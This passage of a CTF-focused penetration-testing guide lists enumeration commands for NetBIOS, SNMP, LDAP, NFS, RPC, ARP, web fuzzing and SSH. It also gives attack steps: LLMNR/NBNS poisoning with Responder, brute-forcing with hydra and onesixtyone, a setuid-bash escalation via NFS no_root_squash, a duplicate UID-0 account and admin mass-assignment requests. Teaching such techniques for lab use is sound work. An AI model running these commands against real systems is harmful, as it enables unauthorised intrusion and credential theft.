**Common Null Session Vulnerabilities**

- Windows 2000/XP with default configurations
- Improperly configured Samba servers
- Systems with RestrictAnonymous registry key set to 0

### NetBIOS Spoofing & MITM

**Responder** - NetBIOS/LLMNR poisoning

```bash
# Listen on interface
responder -I eth0

# Analyze mode (no poisoning)
responder -I eth0 -A

# Target specific protocols
responder -I eth0 -r -d -w

# Force WPAD authentication
responder -I eth0 -F
```

**Metasploit Auxiliary Modules**

```bash
# NetBIOS name service spoofer
use auxiliary/spoof/nbns/nbns_response

# LLMNR spoofer
use auxiliary/spoof/llmnr/llmnr_response
```

### Practical CTF Methodology

1. **Initial NetBIOS Discovery**

```bash
nmap -sU -p 137 --open 192.168.1.0/24
nbtscan -r 192.168.1.0/24
```

2. **Detailed Enumeration of Discovered Hosts**

```bash
enum4linux -a <target>
```

3. **Test for Null Sessions and Anonymous Access**

```bash
smbclient -L //<target> -N
rpcclient -U "" -N <target>
```

4. **Extract User Lists for Password Attacks**

```bash
enum4linux -U <target> | grep "user:" | cut -d "[" -f2 | cut -d "]" -f1 > users.txt
```

5. **Search for Accessible Shares**

```bash
smbclient -L //<target> -N
smbmap -H <target> -u anonymous
```

### Important Notes

[Unverified] NetBIOS enumeration success rates vary significantly based on OS version and patch level. Windows 10/11 and Server 2016+ have substantially restricted anonymous enumeration by default compared to legacy systems.

[Inference] In modern CTF environments, NetBIOS enumeration often requires valid credentials rather than null sessions, but misconfigurations mimicking legacy environments remain common in competition scenarios.

**Related Topics to Explore**: SMB relay attacks, NTLM authentication mechanisms, Active Directory enumeration, Kerberos enumeration, LDAP enumeration

---

## SNMP Enumeration

Simple Network Management Protocol (SNMP) operates on UDP ports 161 (agent) and 162 (trap) and uses community strings for authentication. Default community strings like "public" (read-only) and "private" (read-write) are frequently misconfigured in CTF environments.

### SNMP Versions and Security Context

- **SNMPv1/v2c**: Community string-based authentication, transmitted in cleartext
- **SNMPv3**: Supports authentication and encryption [Inference: more secure but less common in basic CTF scenarios]

### Core Enumeration Tools

**snmpwalk** - Retrieves MIB tree information:

```bash
snmpwalk -v2c -c public <target_ip>
snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.1  # System information
snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.6.13.1.3  # TCP local ports
snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

**snmp-check** - Automated enumeration with formatted output:

```bash
snmp-check <target_ip>
snmp-check -c public <target_ip>
snmp-check -c public -v 2c <target_ip>
```

**onesixtyone** - Fast community string brute-forcing:

```bash
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <target_ip>
onesixtyone -c community_strings.txt -i targets.txt
```

**Nmap SNMP scripts**:

```bash
nmap -sU -p 161 --script=snmp-brute <target_ip>
nmap -sU -p 161 --script=snmp-info <target_ip>
nmap -sU -p 161 --script=snmp-processes <target_ip>
nmap -sU -p 161 --script=snmp-win32-users <target_ip>
```

### Key MIB Objects for Enumeration

- `1.3.6.1.2.1.1` - System information (hostname, OS)
- `1.3.6.1.2.1.2` - Network interfaces
- `1.3.6.1.2.1.4.20.1.1` - IP addresses
- `1.3.6.1.2.1.25.1.6.0` - Running processes count
- `1.3.6.1.2.1.25.4.2.1.2` - Process list
- `1.3.6.1.2.1.25.6.3.1.2` - Installed software
- `1.3.6.1.4.1.77.1.2.25` - Windows user accounts

### Exploitation Context

Writable community strings ("private" or custom) enable:

- Configuration modification
- Service disruption via SNMP SET operations
- Information modification for privilege escalation paths

## LDAP Enumeration

Lightweight Directory Access Protocol (LDAP) operates on TCP ports 389 (unencrypted) and 636 (LDAPS/encrypted). LDAP stores organizational information including users, groups, computers, and permissionsâ€”critical for Active Directory environments.

### Anonymous Bind Testing

Test for anonymous authentication (common misconfiguration):

```bash
ldapsearch -x -h <target_ip> -s base
ldapsearch -x -h <target_ip> -b "dc=example,dc=com"
```

**Parameters**:

- `-x` - Simple authentication (no SASL)
- `-h` - LDAP server hostname/IP
- `-b` - Base DN (Distinguished Name) for search
- `-s` - Scope: base, one, sub (subtree)

### User and Group Enumeration

```bash
# Enumerate all users
ldapsearch -x -h <target_ip> -b "dc=example,dc=com" "(objectClass=user)"

# Enumerate specific attributes
ldapsearch -x -h <target_ip> -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName userPrincipalName memberOf

# Enumerate groups
ldapsearch -x -h <target_ip> -b "dc=example,dc=com" "(objectClass=group)" cn member

# Find domain admins
ldapsearch -x -h <target_ip> -b "dc=example,dc=com" "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com)"

# Authenticated search with credentials
ldapsearch -x -h <target_ip> -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

### Nmap LDAP Scripts

```bash
nmap -p 389 --script ldap-rootdse <target_ip>
nmap -p 389 --script ldap-search --script-args 'ldap.base="dc=example,dc=com"' <target_ip>
nmap -p 389 --script ldap-brute <target_ip>
```

### ldapdomaindump (Comprehensive AD Extraction)

```bash
ldapdomaindump <target_ip> -u 'domain\user' -p 'password'
ldapdomaindump -u user@domain.local -p password ldap://<target_ip>
```

Outputs HTML/JSON/GREP-formatted files containing users, groups, computers, policies.

### windapsearch (Active Directory Focused)

```bash
# Enumerate users
./windapsearch.py -d example.com --dc-ip <target_ip> -U

# Enumerate privileged users
./windapsearch.py -d example.com --dc-ip <target_ip> --privileged-users

# Enumerate computers
./windapsearch.py -d example.com --dc-ip <target_ip> -C
```

### LDAP Filters for Targeted Enumeration

- `(objectClass=*)` - All objects
- `(objectClass=user)` - User accounts
- `(objectClass=computer)` - Computer accounts
- `(servicePrincipalName=*)` - Kerberoastable accounts
- `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` - DONT_REQ_PREAUTH (ASREProastable)
- `(adminCount=1)` - Protected/privileged accounts

## NFS Enumeration

Network File System (NFS) operates on TCP/UDP port 2049 with RPC portmapper on port 111. NFS shares often contain sensitive files, credentials, SSH keys, or backup data.

### Service Discovery

```bash
nmap -p 111,2049 -sV <target_ip>
nmap -p 111 --script=rpcinfo <target_ip>
nmap -p 2049 --script nfs-* <target_ip>
```

### Showmount - List Exported Shares

```bash
showmount -e <target_ip>
showmount -a <target_ip>  # Show clients and mount points
showmount -d <target_ip>  # Show directories only
```

### Mounting NFS Shares

```bash
# Create mount point
mkdir /mnt/nfs_share

# Mount the share
mount -t nfs <target_ip>:/share /mnt/nfs_share
mount -t nfs -o vers=3 <target_ip>:/share /mnt/nfs_share
mount -t nfs -o nolock <target_ip>:/share /mnt/nfs_share

# Mount with specific user context
mount -t nfs -o vers=3,nolock,user=<uid> <target_ip>:/share /mnt/nfs_share
```

### NFS Version-Specific Considerations

- **NFSv2/v3**: No authentication, relies on IP-based access control and UID/GID matching
- **NFSv4**: Introduces authentication mechanisms [Inference: less common in CTF environments]

### UID/GID Manipulation for Access

NFS trusts client-provided UID/GID. If files are owned by UID 1000 on the server:

```bash
# Check file ownership
ls -ln /mnt/nfs_share

# Create local user with matching UID
useradd -u 1000 tempuser
su - tempuser
cd /mnt/nfs_share
```

### Nmap NFS Scripts

```bash
nmap -p 111,2049 --script nfs-ls <target_ip>
nmap -p 111,2049 --script nfs-showmount <target_ip>
nmap -p 111,2049 --script nfs-statfs <target_ip>
```

### Privilege Escalation via NFS

If NFS share is mounted with `no_root_squash`, root on client = root on server:

```bash
# On attacker machine with mounted share
cp /bin/bash /mnt/nfs_share/bash
chmod +s /mnt/nfs_share/bash

# On target machine (if accessible)
/shared/path/bash -p
```

## RPC Enumeration

Remote Procedure Call (RPC) uses portmapper (port 111) to dynamically assign ports to services. RPC services include NFS, NIS, mountd, and various administrative interfaces.

### rpcinfo - Service Enumeration

```bash
rpcinfo -p <target_ip>
rpcinfo -s <target_ip>  # Service summary
rpcinfo -t <target_ip> <program> <version>  # Test specific service
```

Output shows:

- Program number
- Version
- Protocol (TCP/UDP)
- Port number
- Service name

### Nmap RPC Enumeration

```bash
nmap -p 111 --script rpcinfo <target_ip>
nmap -p 111 --script rpc-grind <target_ip>
nmap -sV -p- <target_ip>  # Comprehensive service detection
```

### rpcclient - Windows RPC Interaction

```bash
# Anonymous connection (null session)
rpcclient -U "" <target_ip>
rpcclient -U "" -N <target_ip>

# Authenticated connection
rpcclient -U "username%password" <target_ip>
```

**rpcclient commands**:

```bash
srvinfo          # Server information
enumdomusers     # List domain users
enumdomgroups    # List domain groups
queryuser <RID>  # User details by RID
querygroup <RID> # Group details
querydispinfo    # Display information
netshareenum     # List shares
netsharegetinfo <share>  # Share details
```

### enum4linux - Automated Windows/Samba Enumeration

```bash
enum4linux -a <target_ip>
enum4linux -U <target_ip>  # Users
enum4linux -S <target_ip>  # Shares
enum4linux -G <target_ip>  # Groups
enum4linux -P <target_ip>  # Password policy
enum4linux -u administrator -p password <target_ip>  # Authenticated
```

### RPC Services and Exploitation Context

Common RPC programs:

- **100000** - portmapper
- **100003** - NFS
- **100005** - mountd
- **100024** - status monitor
- **391002** - NIS (ypserv)

[Inference: Specific RPC vulnerabilities depend on service versions and require CVE-specific exploitation techniques]

## ARP Scanning

Address Resolution Protocol (ARP) operates at Layer 2 (Data Link) and maps IP addresses to MAC addresses. ARP scanning is effective for discovering hosts on the local network segment, bypassing some firewall rules.

### arp-scan - Dedicated ARP Scanner

```bash
# Scan local subnet
arp-scan -l

# Scan specific network
arp-scan 192.168.1.0/24

# Scan with custom interface
arp-scan -I eth0 192.168.1.0/24

# Increase scan speed
arp-scan --bandwidth=10000000 192.168.1.0/24

# Show vendor information
arp-scan --localnet
```

### netdiscover - Interactive ARP Scanner

```bash
# Passive mode (listen only)
netdiscover -p

# Active scanning
netdiscover -r 192.168.1.0/24
netdiscover -i eth0 -r 192.168.1.0/24

# Fast mode
netdiscover -r 192.168.1.0/24 -f
```

### Nmap ARP Scan

```bash
nmap -sn -PR 192.168.1.0/24
nmap -PR -sn --send-ip 192.168.1.0/24
```

**Note**: Nmap's `-sn` (ping scan) uses ARP for local networks by default on Ethernet segments.

### arping - Targeted ARP Ping

```bash
arping -c 4 192.168.1.1
arping -I eth0 192.168.1.1
arping -d 192.168.1.1  # Duplicate IP detection
```

### Manual ARP Table Inspection

```bash
# View ARP cache
arp -a
arp -n  # Numeric format
ip neigh show

# Clear ARP cache (requires root)
ip -s -s neigh flush all
```

### ARP Scanning Advantages

1. **Firewall bypass**: Operates below IP layer, not filtered by Layer 3+ firewalls
2. **Speed**: Faster than ICMP/TCP for local network discovery
3. **Reliability**: Hosts must respond to ARP to function on network
4. **Stealth**: [Unverified claim - detection depends on network monitoring capabilities] Less likely logged than higher-layer scans

### ARP Spoofing Detection Context

During enumeration, be aware that ARP responses can be monitored:

```bash
# Detect ARP scanning activity (defensive perspective)
arpwatch  # Monitors ARP table changes
```

---

## Cross-Service Enumeration Strategy

For comprehensive CTF network enumeration:

1. **Initial sweep**: `nmap -sV -sC -p- <target>` for service identification
2. **ARP discovery**: `arp-scan -l` for local segment hosts
3. **RPC/Service mapping**: `rpcinfo -p <target>` to identify dynamic services
4. **Protocol-specific depth**:
    - SNMP: Community string brute-force â†’ MIB tree extraction
    - LDAP: Anonymous bind test â†’ User/group enumeration â†’ Privileged account identification
    - NFS: Share listing â†’ Mount testing â†’ UID manipulation
5. **Credential testing**: Discovered credentials across all enumerated services
6. **Documentation**: Maintain enumeration notes for lateral movement planning

---

# Web Application Assessment

Web application assessment is the process of identifying vulnerabilities in web-based systems through reconnaissance, enumeration, and analysis. This phase establishes the attack surface before exploitation.

## Web Server Identification

### Banner Grabbing Techniques

**Netcat (nc)**

```bash
nc target.com 80
HEAD / HTTP/1.0

# Returns server header information
```

**Telnet**

```bash
telnet target.com 80
HEAD / HTTP/1.0

# Press Enter twice after command
```

**Nmap**

```bash
# Basic service detection
nmap -sV -p80,443 target.com

# Aggressive service detection with scripts
nmap -sV --version-intensity 9 -p80,443 target.com

# HTTP-specific enumeration
nmap -p80,443 --script=http-headers,http-methods target.com
```

**WhatWeb**

```bash
# Basic scan
whatweb target.com

# Verbose output (levels 1-3)
whatweb -v target.com

# Aggressive scan with all plugins
whatweb -a 3 target.com

# Output to file
whatweb target.com -o output.txt
whatweb target.com --log-json=output.json
```

**cURL**

```bash
# Retrieve HTTP headers
curl -I target.com

# Include headers in response
curl -i target.com

# Verbose mode (shows full request/response)
curl -v target.com

# Follow redirects
curl -IL target.com

# Specify user agent
curl -A "Mozilla/5.0" -I target.com
```

**HTTPie**

```bash
# Headers only
http --headers target.com

# Verbose output
http -v target.com
```

### Key Server Indicators

Headers to examine:

- `Server:` - Web server type/version (Apache, Nginx, IIS)
- `X-Powered-By:` - Backend technology (PHP, ASP.NET)
- `X-AspNet-Version:` - .NET framework version
- `X-AspNetMvc-Version:` - MVC framework version

**[Inference]** Absence of server headers may indicate security hardening or reverse proxy usage.

## CMS Detection

### Automated CMS Identification

**WhatWeb** (shown above) detects CMS platforms automatically.

**Wappalyzer (CLI)**

```bash
# Install via npm
npm install -g wappalyzer

# Scan target
wappalyzer target.com
```

**CMSmap**

```bash
# Detect CMS type
cmsmap target.com

# WordPress-specific scan
cmsmap -t target.com -f W

# Joomla-specific scan
cmsmap -t target.com -f J

# Drupal-specific scan
cmsmap -t target.com -f D
```

**WPScan (WordPress)**

```bash
# Basic enumeration
wpscan --url target.com

# Enumerate vulnerable plugins
wpscan --url target.com --enumerate vp

# Enumerate all plugins
wpscan --url target.com --enumerate ap

# Enumerate users
wpscan --url target.com --enumerate u

# Enumerate themes
wpscan --url target.com --enumerate at

# Aggressive detection (disable WP vulndb)
wpscan --url target.com --disable-tls-checks --plugins-detection aggressive

# API token for vulnerability data
wpscan --url target.com --api-token YOUR_TOKEN
```

**Joomscan (Joomla)**

```bash
# Basic scan
joomscan -u target.com

# Enumerate components
joomscan -u target.com -ec
```

**Droopescan (Drupal/SilverStripe)**

```bash
# Scan Drupal site
droopescan scan drupal -u target.com

# Scan SilverStripe
droopescan scan silverstripe -u target.com
```

### Manual CMS Detection

**WordPress Indicators:**

- `/wp-admin/` - Admin panel
- `/wp-content/` - Content directory
- `/wp-includes/` - Core files
- `<meta name="generator" content="WordPress X.X">` in HTML

**Joomla Indicators:**

- `/administrator/` - Admin panel
- `/components/` - Component directory
- `/modules/` - Module directory
- `<meta name="generator" content="Joomla! X.X">` in HTML

**Drupal Indicators:**

- `/user/login` - Login page
- `/core/` - Core directory (Drupal 8+)
- `/sites/default/` - Default site files
- `<meta name="Generator" content="Drupal X">` in HTML

**Manual Check with cURL:**

```bash
# Check for WordPress
curl -s target.com | grep -i wordpress

# Check robots.txt
curl target.com/robots.txt

# Check common CMS paths
curl -I target.com/wp-admin/
curl -I target.com/administrator/
curl -I target.com/user/login
```

## Directory/File Enumeration

### Wordlist-Based Fuzzing

**Gobuster**

```bash
# Directory enumeration (dir mode)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Extended options
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50

# Follow redirects
gobuster dir -u http://target.com -w wordlist.txt -r

# Custom status codes to show
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307,401,403"

# Authentication
gobuster dir -u http://target.com -w wordlist.txt -U username -P password

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt

# VHOST enumeration
gobuster vhost -u http://target.com -w wordlist.txt
```

**Parameters:**

- `-u` - URL target
- `-w` - Wordlist path
- `-x` - File extensions to append
- `-t` - Number of threads (default: 10)
- `-r` - Follow redirects
- `-k` - Skip SSL verification
- `-b` - Blacklist status codes
- `-s` - Show specific status codes only
- `-o` - Output file

**Dirb**

```bash
# Basic scan
dirb http://target.com

# Custom wordlist
dirb http://target.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# File extension scanning
dirb http://target.com -X .php,.txt,.html

# Authentication
dirb http://target.com -u username:password

# Proxy usage
dirb http://target.com -p proxy:port

# Save output
dirb http://target.com -o output.txt
```

**Dirsearch**

```bash
# Basic scan
dirsearch -u target.com

# Multiple extensions
dirsearch -u target.com -e php,txt,html,js

# Custom wordlist
dirsearch -u target.com -w /path/to/wordlist.txt

# Threads and recursion
dirsearch -u target.com -t 50 -r

# Exclude status codes
dirsearch -u target.com -x 403,404

# Include redirects
dirsearch -u target.com --follow-redirects

# Output formats
dirsearch -u target.com -o output.txt
dirsearch -u target.com --format=json -o output.json
```

**ffuf**

```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# File extension fuzzing
ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.txt,.html

# Match status codes
ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302

# Filter by response size
ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 4242

# Filter by line count
ffuf -w wordlist.txt -u http://target.com/FUZZ -fl 10

# Threads and rate limiting
ffuf -w wordlist.txt -u http://target.com/FUZZ -t 50 -rate 100

# Output to file
ffuf -w wordlist.txt -u http://target.com/FUZZ -o output.json -of json

# Subdomain fuzzing
ffuf -w subdomains.txt -u http://FUZZ.target.com

# VHOST fuzzing
ffuf -w vhosts.txt -u http://target.com -H "Host: FUZZ.target.com"
```

**Parameters:**

- `-w` - Wordlist
- `-u` - URL with FUZZ keyword
- `-e` - Extensions
- `-mc` - Match HTTP status codes
- `-fc` - Filter HTTP status codes
- `-fs` - Filter response size
- `-fw` - Filter word count
- `-fl` - Filter line count
- `-t` - Threads
- `-rate` - Requests per second
- `-o` - Output file
- `-of` - Output format (json, csv, html)

### Common Wordlists (Kali Linux)

```bash
# Small general lists
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt

# Comprehensive lists
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# SecLists (install if not present: apt install seclists)
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
```

### Recursive Enumeration Strategy

```bash
# Initial broad scan with common wordlist
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o initial.txt

# For each discovered directory, recursively scan
gobuster dir -u http://target.com/discovered-dir -w /usr/share/wordlists/dirb/common.txt

# Automated recursive (dirsearch)
dirsearch -u target.com -r --recursion-depth=3
```

### File-Specific Enumeration

```bash
# Backup files
ffuf -w wordlist.txt -u http://target.com/FUZZ -e .bak,.old,.backup,.swp,.save,~

# Config files
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt -x conf,config,cfg,ini,xml,yml,yaml

# Source code exposure
gobuster dir -u http://target.com -w wordlist.txt -x .php.bak,.inc,.phps,.php~,.php.old
```

## Hidden Parameter Discovery

### GET Parameter Fuzzing

**Arjun**

```bash
# Basic parameter discovery
arjun -u http://target.com/page

# Specify method
arjun -u http://target.com/page -m GET

# Custom wordlist
arjun -u http://target.com/page -w /path/to/params.txt

# Headers
arjun -u http://target.com/page -H "Authorization: Bearer token"

# Threads
arjun -u http://target.com/page -t 10

# Output to file
arjun -u http://target.com/page -o output.txt

# Import URLs from file
arjun -i urls.txt

# Delay between requests
arjun -u http://target.com/page --delay 1
```

**ffuf for Parameters**

```bash
# GET parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://target.com/page?FUZZ=test

# Multiple parameter positions
ffuf -w params.txt:PARAM -w values.txt:VAL -u http://target.com/page?PARAM=VAL

# Filter false positives by response size
ffuf -w params.txt -u http://target.com/page?FUZZ=test -fs 1234
```

**Param Miner (Burp Extension Equivalent - Manual)**

```bash
# Using ffuf with parameter wordlist
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/api/FUZZ

# Common parameter wordlists
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

### POST Parameter Discovery

**Arjun (POST mode)**

```bash
# POST parameter discovery
arjun -u http://target.com/login -m POST

# With existing known parameters
arjun -u http://target.com/action -m POST -d "username=admin&password=test"
```

**ffuf for POST**

```bash
# POST data fuzzing
ffuf -w params.txt -u http://target.com/action -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"

# JSON parameter fuzzing
ffuf -w params.txt -u http://target.com/api/endpoint -X POST -d '{"FUZZ":"test"}' -H "Content-Type: application/json"
```

### Header Parameter Discovery

**ffuf for Headers**

```bash
# Header fuzzing
ffuf -w headers.txt -u http://target.com -H "FUZZ: test"

# Common headers wordlist
/usr/share/seclists/Discovery/Web-Content/header-names.txt

# X-Forwarded headers
ffuf -w /usr/share/seclists/Fuzzing/http-request-headers.txt -u http://target.com -H "FUZZ: 127.0.0.1"
```

### Cookie Parameter Discovery

```bash
# Cookie fuzzing with ffuf
ffuf -w params.txt -u http://target.com -H "Cookie: FUZZ=test"

# Multiple cookie values
ffuf -w params.txt -u http://target.com -H "Cookie: session=valid; FUZZ=test"
```

### Mass Assignment / Parameter Pollution Detection

**[Inference]** After discovering valid parameters, test for additional parameters that might be accepted but not documented:

```bash
# Test multiple parameters simultaneously
curl -X POST http://target.com/api/user -d "username=test&email=test@test.com&role=admin&isAdmin=true"

# JSON mass assignment test
curl -X POST http://target.com/api/user -H "Content-Type: application/json" -d '{"username":"test","email":"test@test.com","role":"admin","isAdmin":true}'
```

### Wordlists for Parameter Discovery

```bash
# Burp parameter names (comprehensive)
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Common API parameters
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Common query parameters
/usr/share/seclists/Discovery/Web-Content/common-query-params.txt
```

---

## Important Subtopics for Further Study

- **Authentication Bypass Techniques** - Testing discovered parameters for auth vulnerabilities
- **Input Validation Testing** - XSS, SQLi, command injection on discovered parameters
- **API Endpoint Enumeration** - REST/GraphQL specific discovery techniques
- **Web Application Firewall (WAF) Detection and Bypass** - Identifying security controls during enumeration
- **Subdomain Enumeration** - Expanding attack surface beyond main domain

---

# Linux/Unix-Specific Enumeration

## SSH Enumeration

SSH enumeration identifies running SSH services, determines protocol versions, gathers key exchange information, and fingerprints the SSH implementation for version-specific vulnerability research.

**Service Discovery and Port Identification**

Use `nmap` with service version detection to identify SSH services across the network:

```bash
nmap -sV -p 22 <target>
nmap -sV -p- <target>
nmap -sV -p 22,2222,22000-22100 <target>
```

The `-sV` flag performs version detection by connecting to identified open ports and analyzing banner responses. SSH typically runs on port 22, but enumerate alternative ports when standard reconnaissance indicates non-standard configurations.

For UDP-based scanning or when TCP SYN scans are restricted:

```bash
nmap -sU -p 22 <target>
```

**Banner Grabbing and Protocol Analysis**

Direct banner grabbing reveals SSH server implementation and version information:

```bash
nc -v <target> 22
cat </dev/null | nc <target> 22
timeout 2 bash -c 'cat </dev/null > /dev/tcp/<target>/22' && cat </dev/tcp/<target>/22
```

OpenSSH typically responds with a banner like `SSH-2.0-OpenSSH_7.4` or `SSH-1.99-OpenSSH_3.9p1`. The format provides:

- Protocol version (SSH-2.0 or SSH-1.99 indicating SSH1 support)
- Implementation name (OpenSSH, libssh, Dropbear, etc.)
- Implementation version
- Optional platform information

**Advanced SSH Fingerprinting**

The `ssh-keyscan` utility performs non-interactive SSH host key retrieval:

```bash
ssh-keyscan -t rsa,dsa,ecdsa,ed25519 <target>
ssh-keyscan -p 2222 <target>
ssh-keyscan -T 10 <target>
```

Parameters: `-t` specifies key types, `-p` specifies port (default 22), `-T` sets connection timeout in seconds. Output shows host keys in a format suitable for `known_hosts` files. Analyze key types and sizes for infrastructure insightsâ€”presence of older DSA keys suggests legacy systems.

**Vulnerability Assessment**

Query SSH implementation versions against known vulnerability databases:

```bash
searchsploit OpenSSH 7.4
```

Cross-reference identified versions with CVE databases. [Unverified] Some CTF environments include deliberately outdated SSH versions with known vulnerabilities like username enumeration or timing attacks, though specific vulnerability presence depends on server configuration and patches applied.

**Credential Enumeration Techniques**

SSH permits username enumeration through authentication timing differences:

```bash
ssh -v invalid_user@<target> 2>&1 | grep -i "no such user"
```

[Inference] Authentication timing varies between valid and invalid usernames due to different code paths in authentication handlers, though this behavior depends on specific SSH implementation details not guaranteed across all versions.

Automated enumeration tools:

```bash
hydra -L userlist.txt -p password <target> ssh
medusa -h <target> -u username -P passlist.txt -M ssh
```

**Key Exchange and Algorithm Analysis**

Examine supported algorithms using `sshpass` combined with verbose output:

```bash
ssh -v <target> 2>&1 | grep -E "kex|encrypt|mac|host"
```

Review supported key exchange algorithms, encryption ciphers, and message authentication codes. Weak algorithms (DES, RC4, MD5-based MACs) indicate potential cryptographic weaknesses [Unverified] depending on SSH library implementation and compilation flags.

---

## NFS Share Discovery

NFS (Network File System) enumeration identifies exported shares, maps mount points, and determines access permissions for potential privilege escalation or data extraction.

**NFS Service Identification**

Identify NFS services running on standard and non-standard ports:

```bash
nmap -sV -p 111,2049,20048 <target>
nmap -sV -p 111,2049 --script nfs* <target>
rpcinfo -p <target>
```

NFS relies on RPC (Remote Procedure Call) services. Port 111 typically runs `portmapper` (rpcbind), port 2049 runs the NFS daemon. The `rpcinfo` command queries the RPC portmapper to enumerate all registered services:

```bash
rpcinfo -p <target> | grep nfs
```

Output displays NFS version numbers (typically 2, 3, or 4), protocols (tcp/udp), and port assignments.

**Export List Enumeration**

Query the NFS server for exported shares:

```bash
showmount -e <target>
showmount -e --all <target>
nmap -p 111 --script=nfs-showmount <target>
```

The `showmount` command (available on Linux systems with NFS utilities installed) queries the `mountd` service to display exported filesystems. Output format:

```
Export list for <target>:
/exported/path  <IP-range-or-client>
/home           *
/var/backups    192.168.1.0/24
```

Wildcards (*) indicate world-readable exports; specific IP ranges restrict access. `/etc/exports` on NFS servers defines these policies [Inference] but enumeration tools reveal only what the server advertises regardless of actual access restrictions.

**Mount Point Access Testing**

Attempt mounting discovered NFS exports:

```bash
mount -t nfs <target>:/exported/path /mnt/nfs
mount -t nfs -o nolock <target>:/home /mnt/nfs_home
mount -t nfsv4 <target>:/ /mnt/nfsv4
```

Use `nolock` option when the NFS server lacks proper locking daemon support. NFSv3 mounts may succeed even without explicit access grants [Inference] due to authentication model differences compared to NFSv4.

**Permissions and Access Control Analysis**

After mounting, examine file permissions and ownership:

```bash
ls -la /mnt/nfs
stat /mnt/nfs/file.txt
getfacl /mnt/nfs/directory
```

NFS UID/GID mapping determines effective permissions. Root access on NFS clients does not guarantee root access to mounted shares [Inference] when `root_squash` is configured on the server, mapping root to `nobody` user (typically UID 65534).

Test privilege behavior:

```bash
touch /mnt/nfs/test_file.txt
cat /mnt/nfs/etc_shadow_copy
```

If files owned by root are writable by non-root users, root_squash is not configured [Inference]. This condition enables privilege escalation through NFS when combined with setuid binaries or configuration files editable by unprivileged users.

**Advanced Enumeration with Nmap**

Comprehensive NFS reconnaissance:

```bash
nmap -p 111 --script=rpc-grind <target>
nmap -p 111 --script=nfs* --script-args nfs.version=3 <target>
```

The `rpc-grind` script enumerates RPC services; NFS-specific scripts perform version detection, export listing, and permission analysis.

**Credential and UID Mapping**

NFS v3 and earlier use UID-based authentication [Unverified] without strong cryptographic verification. Potential UID/GID manipulation:

```bash
useradd -u 0 -o -s /bin/bash root_copy
```

[Inference] Adding local users with UIDs matching remote NFS server users may grant access to those users' files when mounted with NFS v3 and no_root_squash configuration, though actual behavior depends on mount options and server-side access controls.

---

## Linux Service Enumeration

Service enumeration identifies running services, determines versions, maps listening ports, and correlates services with potential vulnerabilities.

**Network Service Discovery**

Comprehensive port scanning identifies running services:

```bash
nmap -sV <target>
nmap -sV -p- <target>
nmap -sV -A <target>
```

The `-A` flag combines OS detection, version detection, script scanning, and traceroute. For large networks:

```bash
nmap -sV --top-ports 1000 <target-range>
```

**Process-Level Service Enumeration (Local)**

When gaining shell access to target systems, enumerate running services:

```bash
ps aux
ps aux | grep -i service_name
netstat -tlnp
netstat -tulpn | grep LISTEN
ss -tlnp
ss -tulpn | grep LISTEN
```

The `ss` command (socket statistics) provides superior performance on modern systems. Output format displays protocol (tcp/udp), local address:port, state, and associated PID/program name.

**Service Version Fingerprinting**

Connect directly to services for banner information:

```bash
telnet <target> <port>
nc -v <target> <port>
curl -v <target>:<port>
```

Many services respond with version banners during initial connection. HTTP services typically reveal server headers:

```bash
curl -I http://<target>
```

Database services often respond with version strings upon connection (MySQL, PostgreSQL, MongoDB defaults).

**Systemd Service Analysis (Modern Linux)**

Systems using systemd expose service configuration:

```bash
systemctl list-unit-files --type=service
systemctl list-units --type=service --all
systemctl status service_name
systemctl show service_name
journalctl -u service_name -n 50
```

The `show` command displays service properties including ExecStart paths, User/Group ownership, and environment variables. Examine service files directly:

```bash
cat /etc/systemd/system/service_name.service
cat /usr/lib/systemd/system/service_name.service
```

**Init.d Service Analysis (Legacy Systems)**

Older systems use SysVinit:

```bash
ls -la /etc/init.d/
cat /etc/init.d/service_name
chkconfig --list
service --status-all
```

Service startup scripts in `/etc/init.d/` often contain hardcoded paths, credentials, or version information.

**Listening Port Analysis**

Map listening ports to services:

```bash
lsof -i -P -n | grep LISTEN
netstat -tulnp
ss -tulnp
netstat -tulnp | awk '{print $4, $7}' | sort -u
```

Unexpected services on high-numbered ports may indicate backdoors or non-standard deployments. Compare listening ports against standard service defaults to identify anomalies.

**Weak Service Configurations**

Identify services running under unprivileged users but performing privileged operations [Inference] such as database services running as root, web servers handling file operations with elevated privileges, or security services running as standard users without capability sets.

**Service Dependency Analysis**

